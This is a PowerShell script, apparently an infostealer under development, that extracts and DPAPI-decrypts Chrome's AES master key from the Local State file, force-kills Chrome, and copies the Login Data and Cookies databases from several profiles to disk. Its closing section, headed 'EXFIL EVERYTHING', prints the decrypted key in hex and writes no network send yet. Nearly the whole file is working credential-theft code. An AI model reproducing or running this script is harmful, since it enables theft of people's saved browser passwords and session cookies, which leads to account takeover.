Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Text.Encoding
## PULL THE DPAPI-ENCRYPTED AES MASTERKEY FROM THE LOCAL STATE FILE
$encrKeyPath = $env:LOCALAPPDATA + '\Google\Chrome\User Data\Local State'
$encrKey = [System.IO.File]::ReadAllText($encrKeyPath)
$encrKey = ConvertFrom-Json $encrKey
$encrKey = $encrKey.os_crypt.encrypted_key

## DECODE THE KEY FROM BASE64 INTO BYTES
[byte[]]$decodedKey = [System.Convert]::FromBase64String($encrKey)
$decodedKey = $decodedKey | Select-Object -Skip 5
$decodeKey

## USE THE DPAPI TO DECRYPT THE KEY AND CONVERT IT TO HEX
$AESKey = [System.Security.Cryptography.ProtectedData]::Unprotect($decodedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser);
$hexdecKey = ($AESKey | ForEach-Object ToString X2) -join '' #Convert byte[] to hex

# KILL CHROME BECAUSE IT LOCKS THE FILES
taskkill /f /t /im chrome.exe
Start-Sleep -Seconds 5

## GRAB THE LOGIN DATA AND COOKIE FILES
Write-Host "Getting files data"

$profileFolderDirs = 'Default', 'Profile 1', 'Profile 2', 'Profile 3'
foreach ($profile in $profileFolderDirs) {

    try {
        $loginDataPath = $env:LOCALAPPDATA + '\Google\Chrome\User Data\' + $profile + '\Login Data'
        $cookiesPath = $env:LOCALAPPDATA + '\Google\Chrome\User Data\' + $profile + '\Cookies'
        Write-Host $loginDataPath
        Write-Host $cookiesPath
    
        $loginDataBytes = [IO.File]::ReadAllBytes($loginDataPath)
        $cookieBytes = [IO.File]::ReadAllBytes($cookiesPath)
    
        if ($null -eq $loginDataBytes -or $null -eq $cookieBytes) {
            Write-Host "Couldn't read files for $profile (1)"
            continue;
        }
    
        $loginFilePath = $profile + '_login_data.bin';
        $cookiesFilePath = $profile + '_cookies.bin';
    
        # TEST CODE
        [IO.File]::WriteAllBytes($cookiesFilePath, $cookieBytes)
        [IO.File]::WriteAllBytes($loginFilePath, $loginDataBytes)
    }
    catch {
        Write-Host "Couldn't read files for $profile"
        continue
    }
    
}



## EXFIL EVERYTHING

# $hexDecKey, $loginDataBytes, $cookieBytes
Write-Host $hexdecKey